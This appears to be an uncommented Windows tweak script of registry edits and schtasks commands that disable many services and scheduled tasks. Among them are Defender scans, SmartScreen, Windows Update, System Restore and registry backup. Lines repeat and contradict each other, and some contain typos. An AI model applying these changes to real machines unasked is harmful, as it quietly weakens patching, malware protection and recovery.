reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sshd" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wersvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdatem" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WMPNetworkSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\debugregsvc" /v "Start" /t reg_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ndu" /v "Start" /d "2" /t reg_DWORD /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /d "3" /t reg_DWORD /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t reg_DWORD /d "3" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t reg_DWORD /d "3" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertPropSvc" /v "Start" /t reg_DWORD /d "3" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ndu" /v "Start" /d "00000002" /t REG_DWORD /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /d "00000003" /t REG_DWORD /f >nul 2>&1
reg add "HKCR\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\ShellFolder" /f /v "Attributes" /t REG_DWORD /d "0" 
reg add "HKCR\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\ShellFolder" /f /v "Attributes" /t REG_DWORD /d "0" 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSync" /t REG_DWORD /d "1" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableMeteredNetworkFileSync" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableLibrariesDefaultSaveToOneDrive" /t REG_DWORD /d "0" /f 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d 4 /f
cls
schtasks /change /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /DISABLE
schtasks /change /TN "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /DISABLE
schtasks /change /TN "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /DISABLE
schtasks /Change /TN "Microsoft\Windows\ErrorDetails\EnableErrorDetailsUpdate" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable
schtasks /change /TN "Microsoft\Windows\Device Information\Device" /disable
schtasks /change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable
schtasks /change /TN "Microsoft\Windows\Application Experience\AitAgent" /disable
schtasks /change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /disable
schtasks /change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable 2>nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable 2>nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable 2>nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable 2>nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable 2>nul
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader" /Disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyUpload" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack" /Disable
schtasks /Change /TN "Microsoft\Office\Office 15 Subscription Heartbeat" /Disable
schtasks /change /disable /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\DiskFootprint\Diagnostics" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\InstallService\ScanForUpdates" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\InstallService\ScanForUpdatesAsUser" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Registry\RegIdleBackup" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\StateRepository\MaintenanceTasks" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\SystemRestore\SR" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Windows Error Reporting\QueueReporting" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\ApplicationData\appuriverifierdaily" >nul 2>&11
schtasks /change /disable /TN "\Microsoft\Windows\Application Experience\StartupAppTask" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Application Experience\MareBackup" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Application Experience\ProgramDataUpdater" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Autochk\Proxy" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Device Information\Device User" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Device Information\Device" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Feedback\Siuf\DmClient" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Flighting\FeatureConfig\UsageDataFlushing" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Flighting\FeatureConfig\UsageDataReporting" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\InputSettingsRestoreDataAvailable" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\LocalUserSyncDataAvailable" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\MouseSyncDataAvailable" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\PenSyncDataAvailable" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\syncpensettings" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Input\TouchpadSyncDataAvailable" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Location\Notifications" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Location\WindowsActionDialog" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\ApplicationData\DsSvcCleanup" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Maintenance\WinSAT" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\PI\Sqm-Tasks" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Shell\IndexerAutomaticMaintenance" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Maps\MapsToastTask" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\Maps\MapsUpdateTask" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" >nul 2>&1
schtasks /change /disable /TN "\Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\TaskScheduler" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\WaaSMedic" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\WindowsUpdate" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\WindowsUpdate\Scheduled Start" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Wake To Work" >nul 2>&1
schtasks /delete /f /tn "\Microsoft\Windows\UpdateOrchestrator\Start Oobe Expedite Work" >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\ErrorDetails\EnableErrorDetailsUpdate" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable >nul 2>&1
schtasks /Change /TN "\Microsoft\Windows\Application Experience\AitAgent" /DISABLE >nul
schtasks /Change /TN "\Microsoft\Windows\Media Center\ehDRMInit" /DISABLE > nul
schtasks /change /TN NvTmMon_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8} /DISABLE
schtasks /change /TN NvTmRep_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8} /DISABLE
schtasks /change /TN NvTmRepOnLogon_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8} /DISABLE
schtasks /change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack" /DISABLE
schtasks /change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack2016" /DISABLE
schtasks /change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn" /DISABLE
schtasks /change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn2016" /DISABLE
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable
schtasks /Change /TN "Microsoft\Windows\AppID\SmartScreenSpecific" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\FileHistory\File History (maintenance mode)" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\SynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Enable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Enable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Enable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Enable
schtasks /Delete /TN "\Microsoft\Windows\Defrag\ScheduledDefrag" /F
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater"
schtasks /change /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\StartupAppTask"
schtasks /change /tn "\Microsoft\Windows\Application Experience\StartupAppTask" /disable
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver"
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" /disable
schtasks /end /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"
schtasks /change /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyUpload"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" /disable
schtasks /end /tn "\Microsoft\Windows\Autochk\Proxy"
schtasks /change /tn "\Microsoft\Windows\Autochk\Proxy" /disable
schtasks /end /tn "\Microsoft\Windows\Maintenance\WinSAT"
schtasks /change /tn "\Microsoft\Windows\Maintenance\WinSAT" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\AitAgent"
schtasks /change /tn "\Microsoft\Windows\Application Experience\AitAgent" /disable
schtasks /end /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting"
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable
schtasks /end /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask"
schtasks /change /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /disable
schtasks /end /tn "\Microsoft\Windows\DiskFootprint\Diagnostics"
schtasks /change /tn "\Microsoft\Windows\DiskFootprint\Diagnostics" /disable
schtasks /end /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)"
schtasks /change /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)" /disable
schtasks /end /tn "\Microsoft\Windows\PI\Sqm-Tasks"
schtasks /change /tn "\Microsoft\Windows\PI\Sqm-Tasks" /disable
schtasks /end /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo"
schtasks /change /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /disable
schtasks /end /tn "\Microsoft\Windows\AppID\SmartScreenSpecific"
schtasks /change /tn "\Microsoft\Windows\AppID\SmartScreenSpecific" /disable
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016"
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016" /disable
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016"
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016" /disable
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn"
schtasks /change /TN "\Microsoft\Office\OfficeTelemetryAgentLogOn" /disable
schtasks /end /tn "\Microsoftd\Office\OfficeTelemetryAgentFallBack"
schtasks /change /TN "\Microsoftd\Office\OfficeTelemetryAgentFallBack" /disable
schtasks /end /tn "\Microsoft\Office\Office 15 Subscription Heartbeat"
schtasks /change /TN "\Microsoft\Office\Office 15 Subscription Heartbeat" /disable
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime"
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /disable
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\SynchronizeTime"
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\SynchronizeTime" /disable
schtasks /end /tn "\Microsoft\Windows\WindowsUpdate\Automatic App Update"
schtasks /change /TN "\Microsoft\Windows\WindowsUpdate\Automatic App Update" /disable
schtasks /end /tn "\Microsoft\Windows\Device Information\Device"
schtasks /change /TN "\Microsoft\Windows\Device Information\Device" /disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\PcaPatchDbTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Defrag\ScheduledDefrag" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device User" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskCleanup\SilentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\StorageSense" /Disable
schtasks /Change /TN "Microsoft\Windows\DUSM\dusmtask" /Disable
schtasks /Change /TN "Microsoft\Windows\EnterpriseMgmt\MDMMaintenenceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClient" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataFlushing" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\OneSettings\RefreshCache" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\LocalUserSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\MouseSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\PenSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\TouchpadSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\International\Synchronize Language Settings" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Installation" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\ReconcileLanguageResources" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Uninstallation" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Cellular" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Logon" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsToastTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsUpdateTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser" /Disable
schtasks /Change /TN "Microsoft\Windows\MUI\LPRemove" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /Disable
schtasks /Change /TN "Microsoft\Windows\PushToInstall\Registration" /Disable
schtasks /Change /TN "Microsoft\Windows\Ras\MobilityManager" /Disable
schtasks /Change /TN "Microsoft\Windows\RecoveryEnvironment\VerifyWinRE" /Disable
schtasks /Change /TN "Microsoft\Windows\RemoteAssistance\RemoteAssistanceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\RetailDemo\CleanupOfflineContent" /Disable
schtasks /Change /TN "Microsoft\Windows\Servicing\StartComponentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\SettingSync\NetworkStateChangeTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SetupCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SnapshotCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceAgentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceManagerTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Speech\SpeechModelDownloadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\ResPriStaticDbSync" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\WsSwapAssessmentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Task Manager\Interactive" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-HASCertRetr" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\UPnP\UPnPHostConfig" /Disable
schtasks /Change /TN "Microsoft\Windows\User Profile Service\HiveUploadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WDI\ResolutionHost" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Management" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Validation" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Maintenance Work" /Disable
schtasks /Change /TN "Microsoft\Windows\Workplace Join\Automatic-Device-Join" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\NotificationTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\OobeDiscovery" /Disable
schtasks /Change /Disable /TN "\Microsoft\Windows\Defrag\ScheduledDefrag" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\WindowsUpdate\Scheduled Start" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\WindowsUpdate\sihpostreboot" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Application Experience\PcaPatchDbTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Application Experience\StartupAppTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Application Experience\ProgramDataUpdater" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Device Information\Device" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Device Information\Device User" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Shell\IndexerAutomaticMaintenance" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\WaaSMedic\PerformRemediation" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\DiskFootprint\Diagnostics" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\DiskFootprint\StorageSense" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Registry\RegIdleBackup" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskNetwork"  > nul 2> nul
